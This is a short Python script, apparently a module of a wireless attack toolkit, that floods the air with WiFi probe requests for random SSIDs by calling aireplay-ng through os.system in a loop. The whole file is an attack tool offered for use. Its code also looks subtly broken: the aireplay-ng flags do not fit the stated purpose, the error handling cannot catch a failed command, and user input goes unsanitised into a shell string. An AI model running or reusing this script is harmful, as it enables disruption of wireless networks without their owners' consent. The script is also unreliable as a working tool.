#!/usr/bin/env python3
# Probe Request Flood Module

import os, sys, time, subprocess, random

def run():
    print("\n" + "="*60)
    print("PROBE REQUEST FLOOD")
    print("="*60)
    
    interface = input("WiFi interface [wlan0]: ").strip() or "wlan0"
    count = int(input("Number of probe requests [50]: ").strip() or "50")
    
    print(f"\nStarting probe request flood on {interface}")
    print(f"Generating {count} probe requests")
    print("Press Ctrl+C to stop")
    
    try:
        ssids = []
        for i in range(min(count, 50)):
            ssid = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(4, 16)))
            ssids.append(ssid)
        
        for ssid in ssids:
            cmd = f"aireplay-ng -q {interface} -s {ssid}"
            print(f"Probe request for: {ssid}")
            os.system(cmd)
            time.sleep(0.1)
        
        print(f"\nProbe request flood completed!")
    except:
        print("aireplay-ng not installed")
        print("Install aircrack-ng: sudo apt install aircrack-ng")

if __name__ == "__main__":
    run()